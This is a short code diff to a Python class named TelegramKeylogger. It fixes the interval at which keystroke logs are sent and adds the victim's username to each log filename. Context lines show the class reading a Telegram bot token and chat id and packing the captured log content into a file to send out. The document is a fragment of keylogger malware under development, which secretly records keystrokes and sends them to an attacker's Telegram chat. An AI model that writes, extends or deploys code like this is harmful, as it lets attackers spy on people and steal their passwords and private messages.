@@ -13,7 +13,7 @@ class TelegramKeylogger:
     def __init__(self):
         self.bot_token = os.getenv('BOT_TOKEN')
         self.chat_id = os.getenv('CHAT_ID')
-        self.send_interval = int(os.getenv('SEND_INTERVAL', 5))
+        self.send_interval = 20
         self.is_running = True
         self.last_send_time = time.time()
 
@@ -29,7 +29,7 @@ class TelegramKeylogger:
                 return False
 
             timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
-            filename = f"logfile_{timestamp}.txt"
+            filename = f"logfile_{username}_{timestamp}.txt"
 
             file_data = io.BytesIO(log_content.encode('utf-8'))
             file_data.name = filename
